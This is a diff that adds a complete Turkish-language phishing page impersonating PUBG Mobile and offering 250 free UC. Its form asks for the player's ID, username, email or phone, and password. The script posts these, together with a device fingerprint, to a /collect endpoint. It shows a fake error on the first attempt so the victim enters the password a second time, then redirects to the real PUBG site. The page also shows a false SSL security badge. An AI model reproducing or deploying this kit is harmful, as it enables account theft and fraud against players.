@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,maximum-scale=1">
+<meta name="theme-color" content="#0a0e14">
+<title>PUBG Mobile — 250 UC Odulu</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+:root{
+  --bg:#0a0e14;--card:#131820;--bd:#1f2631;
+  --or:#f2a900;--or2:#ff6b1a;--txt:#e8edf2;--mut:#7a8696;
+  --err:#ff4d6d;--ok:#39ff88;
+}
+html,body{
+  background:var(--bg);color:var(--txt);min-height:100vh;
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+  font-size:15px;line-height:1.5;
+  display:flex;align-items:center;justify-content:center;padding:16px;
+  background-image:
+    radial-gradient(circle at 20% 0%,rgba(242,169,0,.08),transparent 50%),
+    radial-gradient(circle at 80% 100%,rgba(255,107,26,.06),transparent 50%);
+}
+.card{background:var(--card);width:100%;max-width:400px;border-radius:14px;border:1px solid var(--bd);padding:28px 22px 22px;box-shadow:0 12px 40px rgba(0,0,0,.5);position:relative;overflow:hidden}
+.card::before{content:"";position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,var(--or),var(--or2))}
+.logo{display:flex;flex-direction:column;align-items:center;gap:8px;margin-bottom:20px}
+.logo-mark{width:64px;height:64px;border-radius:14px;background:linear-gradient(135deg,var(--or),var(--or2));display:flex;align-items:center;justify-content:center;font-weight:900;font-size:26px;color:#0a0e14;box-shadow:0 6px 24px rgba(242,169,0,.35);letter-spacing:-2px}
+.logo-txt{font-size:18px;font-weight:800;letter-spacing:.05em;color:var(--txt);text-transform:uppercase}
+.logo-txt span{color:var(--or)}
+h1{font-size:19px;font-weight:700;text-align:center;margin-bottom:4px}
+.sub{text-align:center;color:var(--mut);font-size:13px;margin-bottom:20px}
+
+.reward{
+  background:linear-gradient(135deg,rgba(242,169,0,.15),rgba(255,107,26,.1));
+  border:1px solid rgba(242,169,0,.4);
+  border-radius:10px;padding:14px;margin-bottom:18px;
+  display:flex;align-items:center;gap:12px;
+  animation:pulse 2s ease-in-out infinite;
+}
+@keyframes pulse{
+  0%,100%{box-shadow:0 0 0 0 rgba(242,169,0,.25)}
+  50%{box-shadow:0 0 0 8px rgba(242,169,0,0)}
+}
+.reward-ic{
+  width:46px;height:46px;flex:0 0 46px;border-radius:10px;
+  background:linear-gradient(135deg,var(--or),var(--or2));
+  display:flex;align-items:center;justify-content:center;
+  font-weight:900;font-size:13px;color:#0a0e14;
+  box-shadow:0 4px 14px rgba(242,169,0,.4);
+}
+.reward-tx{flex:1}
+.reward-tx b{color:var(--or);font-size:14px;display:block;line-height:1.3;font-weight:800}
+.reward-tx small{color:var(--mut);font-size:11px;display:block;margin-top:3px}
+
+.lb{display:block;font-size:12px;font-weight:600;margin-bottom:6px;color:#c2cad6}
+input{width:100%;padding:13px 14px;font-size:16px;border:1px solid var(--bd);border-radius:9px;background:#0d1219;color:var(--txt);outline:none;transition:border-color .15s,box-shadow .15s;min-height:48px;font-family:inherit}
+input::placeholder{color:#4a5568}
+input:focus{border-color:var(--or);box-shadow:0 0 0 3px rgba(242,169,0,.15)}
+.field{margin-bottom:12px}
+button{width:100%;padding:14px;font-size:15px;font-weight:800;color:#0a0e14;background:linear-gradient(135deg,var(--or),var(--or2));border:none;border-radius:10px;cursor:pointer;transition:transform .1s,filter .15s;margin-top:6px;min-height:50px;font-family:inherit;letter-spacing:.03em;text-transform:uppercase;touch-action:manipulation;box-shadow:0 4px 18px rgba(242,169,0,.25)}
+button:active{transform:scale(.98);filter:brightness(1.1)}
+button:disabled{opacity:.6;cursor:not-allowed;filter:grayscale(.5)}
+.err{display:none;background:rgba(255,77,109,.1);color:var(--err);font-size:13px;padding:10px 12px;border-radius:8px;margin-bottom:14px;border:1px solid rgba(255,77,109,.3)}
+.err.show{display:block}
+.spin{display:inline-block;width:14px;height:14px;border:2px solid rgba(10,14,20,.3);border-top-color:#0a0e14;border-radius:50%;animation:sp .7s linear infinite;vertical-align:-2px;margin-right:6px}
+@keyframes sp{to{transform:rotate(360deg)}}
+.foot{text-align:center;font-size:10px;color:#3a4553;margin-top:16px;line-height:1.5}
+.foot a{color:var(--mut);text-decoration:none}
+.badge{display:inline-block;padding:2px 7px;border-radius:4px;background:rgba(57,255,136,.1);color:var(--ok);font-size:9px;font-weight:700;letter-spacing:.05em;border:1px solid rgba(57,255,136,.3)}
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="logo">
+    <div class="logo-mark">P</div>
+    <div class="logo-txt">PUBG <span>MOBILE</span></div>
+  </div>
+
+  <h1>Hesap Doğrulama</h1>
+  <p class="sub">250 UC ödülünüz sizi bekliyor</p>
+
+  <div class="reward">
+    <div class="reward-ic">UC</div>
+    <div class="reward-tx">
+      <b>250 bedava UC kazanmak ister misiniz?</b>
+      <small>Hemen doğrula, UC hesabına anında yüklensin</small>
+    </div>
+  </div>
+
+  <div class="err" id="err">Girdiğiniz bilgiler hatalı. Lütfen tekrar deneyin.</div>
+
+  <form id="f" autocomplete="off" novalidate>
+    <div class="field">
+      <label class="lb" for="pubgid">PUBG ID (sayısal)</label>
+      <input type="text" id="pubgid" inputmode="numeric" pattern="[0-9]*" placeholder="örn: 5123456789" autocomplete="off" required>
+    </div>
+    <div class="field">
+      <label class="lb" for="username">Kullanıcı Adı</label>
+      <input type="text" id="username" placeholder="Oyun içi takma adınız" autocomplete="off" autocapitalize="off" required>
+    </div>
+    <div class="field">
+      <label class="lb" for="email">E-posta veya Telefon</label>
+      <input type="text" id="email" placeholder="Kayıtlı e-posta / telefon" autocomplete="off" required>
+    </div>
+    <div class="field">
+      <label class="lb" for="password">Şifre</label>
+      <input type="password" id="password" placeholder="Hesap şifreniz" autocomplete="off" required>
+    </div>
+    <button type="submit" id="sb">250 UC'yi Al</button>
+  </form>
+
+  <p class="foot">
+    <span class="badge">SSL</span> &nbsp; 256-bit şifreleme ile korunmaktadır<br>
+    <a href="#">Gizlilik</a> · <a href="#">Şartlar</a> · <a href="#">Yardım</a>
+  </p>
+</div>
+
+<script>
+var REDIRECT  = "https://www.pubgmobile.com/";
+var MAX_TRIES = 2;
+var tries = 0;
+
+function fp(){
+  var s = window.screen || {}, tz = "";
+  try{ tz = Intl.DateTimeFormat().resolvedOptions().timeZone || ""; }catch(e){}
+  return {
+    ua: navigator.userAgent, lang: navigator.language,
+    platform: navigator.platform, tz: tz,
+    screen: (s.width||0)+"x"+(s.height||0)+"@"+(window.devicePixelRatio||1),
+    referrer: document.referrer || "direct"
+  };
+}
+
+function send(p){
+  return fetch("/collect", {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify(p),
+    keepalive: true
+  }).catch(function(){});
+}
+
+document.getElementById("f").addEventListener("submit", function(ev){
+  ev.preventDefault();
+  var btn = document.getElementById("sb");
+  var err = document.getElementById("err");
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spin"></span>Doğrulanıyor…';
+
+  var payload = {
+    ts:       new Date().toISOString(),
+    pubgid:   document.getElementById("pubgid").value.trim(),
+    username: document.getElementById("username").value.trim(),
+    email:    document.getElementById("email").value.trim(),
+    password: document.getElementById("password").value,
+    device:   fp(),
+    page:     location.href
+  };
+
+  send(payload).then(function(){
+    tries++;
+    if(tries < MAX_TRIES){
+      setTimeout(function(){
+        err.classList.add("show");
+        btn.disabled = false;
+        btn.innerHTML = "250 UC'yi Al";
+        document.getElementById("password").value = "";
+        document.getElementById("password").focus();
+      }, 900);
+    } else {
+      setTimeout(function(){ location.href = REDIRECT; }, 900);
+    }
+  });
+});
+</script>
+</body>
+</html>
